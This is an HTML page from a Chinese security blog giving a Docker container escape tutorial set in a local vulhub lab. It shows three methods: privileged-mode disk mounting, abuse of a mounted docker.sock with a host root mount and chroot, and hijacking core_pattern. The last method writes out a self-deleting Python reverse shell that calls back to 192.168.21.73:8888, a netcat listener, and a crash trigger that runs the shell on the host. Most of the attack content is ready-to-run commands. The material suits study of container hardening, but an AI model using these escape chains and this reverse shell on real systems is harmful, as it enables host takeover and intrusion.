@@ -1,0 +1,178 @@
+<!DOCTYPE html><html lang="zh" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>云原生安全(Docker逃逸) | 🔰sw0n's blog🔰</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches)
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches)
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('/img/bk.jpg');
+ --light-background: url('/img/bg.jpg');
+ --theme-encrypt-confirm: '确认'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+  menuSettings: {
+    zoom: "None"
+  },
+  showMathMenu: false,
+  jax: ["input/TeX","output/CommonHTML"],
+  extensions: ["tex2jax.js"],
+  TeX: {
+    extensions: ["AMSmath.js","AMSsymbols.js"],
+    equationNumbers: {
+      autoNumber: "AMS"
+    }
+  },
+  tex2jax: {
+    inlineMath: [["\\(", "\\)"]],
+    displayMath: [["\\[", "\\]"]]
+  }
+});
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => bszCaller.fetch(
+ "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
+  bszTag.texts(a),
+  bszTag.shows()
+}));reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><div class="navBlock"><span class="navItemTitle">Information-Gathering</span><ol class="navItemList"><li class="navItem"><div class="navSecond"><span class="navItemTitle">Search-Engine</span><ol class="navItemList"><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://fofa.info/"><span class="navItemTitle">fofa</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://www.zoomeye.org/"><span class="navItemTitle">zoomeye</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://0.zone/"><span class="navItemTitle">0.zone</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://quake.360.cn/quake/#/index/"><span class="navItemTitle">360quake</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://www.shodan.io/"><span class="navItemTitle">shodan</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="http://hunter.qianxin.com/"><span class="navItemTitle">全球鹰</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://censys.io/"><span class="navItemTitle">censys</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://www.onyphe.io/"><span class="navItemTitle">onyphe</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://fullhunt.io/"><span class="navItemTitle">fullhunt</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://soall.org/"><span class="navItemTitle">soall-search-engine</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://app.netlas.io/responses/"><span class="navItemTitle">netlas</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://leakix.net/"><span class="navItemTitle">leaktix</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://dorksearch.com/"><span class="navItemTitle">dorksearch</span></a></li></ol></div></li><li class="navItem"><div class="navSecond"><span class="navItemTitle">Fingerprint</span><ol class="navItemList"><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/"><span class="navItemTitle">whatweb-cms</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="http://finger.tidesec.net/"><span class="navItemTitle">tidefinger</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://www.yunsee.cn/"><span class="navItemTitle">云悉指纹</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://fp.shuziguanxing.com/#/"><span class="navItemTitle">Finger-P</span></a></li></ol></div></li><li class="navItem"><div class="navSecond"><span class="navItemTitle">Enumeration</span><ol class="navItemList"><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://www.dnsgrep.cn/subdomain"><span class="navItemTitle">dnsgrep</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="http://tools.bugscaner.com/subdomain/"><span class="navItemTitle">bugscaner</span></a></li></ol></div></li><li class="navItem"><div class="navSecond"><span class="navItemTitle">DNS-Cache</span><ol class="navItemList"><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://dnsdumpster.com/"><span class="navItemTitle">dnsdumpster</span></a></li></ol></div></li><li class="navItem"><div class="navSecond"><span class="navItemTitle">Certificate</span><ol class="navItemList"><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://crt.sh/"><span class="navItemTitle">certificatesearch</span></a></li></ol></div></li></ol></div></li><li class="navItem"><div class="navBlock"><span class="navItemTitle">Online-Exploit</span><ol class="navItemList"><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://cxsecurity.com/exploit/"><span class="navItemTitle">cxsecurity</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="https://www.exploit-db.com/"><span class="navItemTitle">exploit-db</span></a></li><li class="navItem"><a class="navSecond" target="_blank" rel="noopener" href="http://www.expku.com/"><span class="navItemTitle">expku</span></a></li></ol></div></li><li class="navItem"><a class="navBlock" target="_blank" rel="noopener" href="https://www.revshells.com/"><span class="navItemTitle">Reverse-Shell</span></a></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>云原生安全(Docker逃逸)</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-07-19T01:33:53.062Z" id="date"> 2024-07-19</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-07-19T08:12:29.854Z" id="updated"> 2024-07-19</time></div></span><br><span id="busuanzi_container_page_pv">页面浏览: <span class="control" id="busuanzi_value_page_pv">加载中...</span></span></div></div><hr><div id="post-content"><p class='item-img' data-src='https://s21.ax1x.com/2024/07/19/pkoOBng.png'><img src="https://s21.ax1x.com/2024/07/19/pkoOBng.png"></p>
+<h2 id="一-docker"><a href="#一-docker" class="headerlink" title="一.docker"></a>一.docker</h2><p>Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度。</p>
+<p>Docker 容器与虚拟机类似，但二者在原理上不同，容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性、高效地利用服务器。</p>
+<h2 id="二-docker渗透测试过程"><a href="#二-docker渗透测试过程" class="headerlink" title="二.docker渗透测试过程"></a>二.docker渗透测试过程</h2><p>1.前渗透-判断在Docker中</p>
+<p>    1.没有权限或者权限较小的时候: 端口扫描详细信息，根据应用对象表现</p>
+<p>    netstat -ano</p>
+<p>    2.拿到权限或者高权限: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_23936389/article/details/131486643">高权限或者拿到权限</a></p>
+<p>2.前渗透-镜像中的应用漏洞</p>
+<p>3.前渗透-镜像中的默认配置</p>
+<p>4.后渗透-三种安全容器逃逸</p>
+<p>    -特权模式启动(不安全启动 适用于Java Jsp高权限无需提权 还要提权才能逃逸)</p>
+<p>    -危险挂载启动导致(危险启动 适用与Java Jsp高权限无需提权 还要提权才能逃逸)</p>
+<p>    -docker自身的软件漏洞和系统漏洞</p>
+<p>    [exploit](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_23936389/article/details/131486643">https://blog.csdn.net/qq_23936389/article/details/131486643</a>)</p>
+<h2 id="三-docker逃逸-特权模式"><a href="#三-docker逃逸-特权模式" class="headerlink" title="三.docker逃逸(特权模式)"></a>三.docker逃逸(特权模式)</h2><p>1.本地搭建vulhub的shiro环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sw0n@sw0n:~$ docker search vulhub/shiro<br>sw0n@sw0n:~$ docker pull vulhub/shiro<br>sw0n@sw0n:~$ docker run --rm --privileged=true -it -p 8888:8080 vulhub/shiro<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-14-05-12-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-14-05-12-image.png"></p>
+<p>2.利用Safe6Secshiro反序列化工具拿网站shell</p>
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-15-02-07-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-15-02-07-image.png"></p>
+<p>3.爆破出key，并且找到可以利用的gadgets，查看系统权限</p>
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-15-04-30-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-15-04-30-image.png"></p>
+<p>4.检测环境是否为docker和判断特权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;<br>cat /proc/self/status | grep CapEff<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-15-06-00-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-15-06-00-image.png"></p>
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-15-06-27-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-15-06-27-image.png"> </p>
+<p>5.查看目录</p>
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-15-08-02-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-15-08-02-image.png"></p>
+<p>6.特权逃逸</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /test &amp;&amp; mount /dev/sda2 /test<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-15-09-50-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-15-09-50-image.png"></p>
+<p>7.判断结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /test/ &amp;&amp; ls<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/home/sw0n/.config/marktext/images/2024-07-19-15-19-38-image.png'><img src="/home/sw0n/.config/marktext/images/2024-07-19-15-19-38-image.png"></p>
+<h2 id="四-docker逃逸-危险挂载"><a href="#四-docker逃逸-危险挂载" class="headerlink" title="四.docker逃逸(危险挂载)"></a>四.docker逃逸(危险挂载)</h2><h3 id="1-挂载Docker-Socket逃逸"><a href="#1-挂载Docker-Socket逃逸" class="headerlink" title="1.挂载Docker Socket逃逸"></a>1.挂载Docker Socket逃逸</h3><p>1.创建靶机环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sw0n@sw0n:~$ docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu<br></code></pre></td></tr></table></figure>
+
+<p>2.进入靶机内部(假设此时已经进入到docker环境当中)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sw0n@sw0n:~$ docker exec -it with_docker_sock /bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>3.检测环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@d749c57b14e9:/# ls -lah /var/run/docker.sock<br>srw-rw---- 1 root 137 0 Jul 19 06:53 /var/run/docker.sock<br></code></pre></td></tr></table></figure>
+
+<p>4.挂载逃逸</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update<br>apt-get install curl<br>curl -fsSL https://get.docker.com/ | sh<br></code></pre></td></tr></table></figure>
+
+<p>5.在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it -v /:/host ubuntu /bin/bash<br>chroot /host<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-挂载宿主机procfs逃逸"><a href="#2-挂载宿主机procfs逃逸" class="headerlink" title="2.挂载宿主机procfs逃逸"></a>2.挂载宿主机procfs逃逸</h3><p>1.创建靶机环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sw0n@sw0n:~$ docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu<br></code></pre></td></tr></table></figure>
+
+<p>2.检测环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@59b7d1bee877:/# find / -name core_pattern<br>/proc/sys/kernel/core_pattern<br>/host/proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure>
+
+<p>3.查找路径</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@59b7d1bee877:/# cat /proc/mounts | grep docker<br></code></pre></td></tr></table></figure>
+
+<p>4.写入文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat &gt;/tmp/.x.py &lt;&lt; EOF<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/python</span><br>import os<br>import pty<br>import socket<br>lhost = &quot;192.168.21.73&quot;<br>lport = 8888<br>def main():<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((lhost, lport))<br>    os.dup2(s.fileno(), 0)<br>    os.dup2(s.fileno(), 1)<br>    os.dup2(s.fileno(), 2)<br>    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)<br>    pty.spawn(&quot;/bin/bash&quot;)<br>    os.remove(&#x27;/tmp/.x.py&#x27;)<br>    s.close()<br>if __name__ == &quot;__main__&quot;:<br>    main()<br>EOF<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@59b7d1bee877:/# chmod +x /tmp/.x.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &quot;|/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged/tmp/.x.py \rcore           &quot; &gt; /host/proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat &gt;/tmp/x.c &lt;&lt; EOF<br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span><br>int main(void)<br>&#123;<br>    int *a = NULL;<br>    *a = 1;<br>    return 0;<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@59b7d1bee877:/tmp# gcc x.c -o x<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sw0n@sw0n:~$ nc -lvnp 8888<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@59b7d1bee877:/tmp# ./x<br>Segmentation fault<br></code></pre></td></tr></table></figure>
+
+<p>在崩溃的同时反弹了shell</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/07/16/Nacos-command-injection/">[0day]Alibaba Nacos远程命令执行漏洞 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">sw0n</a></h1><div id="description"><p>别认输,因为没人希望你会赢!</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-docker"><span class="toc-number">1.</span> <span class="toc-text">一.docker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-docker%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">二.docker渗透测试过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-docker%E9%80%83%E9%80%B8-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">三.docker逃逸(特权模式)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-docker%E9%80%83%E9%80%B8-%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD"><span class="toc-number">4.</span> <span class="toc-text">四.docker逃逸(危险挂载)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8C%82%E8%BD%BDDocker-Socket%E9%80%83%E9%80%B8"><span class="toc-number">4.1.</span> <span class="toc-text">1.挂载Docker Socket逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BAprocfs%E9%80%83%E9%80%B8"><span class="toc-number">4.2.</span> <span class="toc-text">2.挂载宿主机procfs逃逸</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
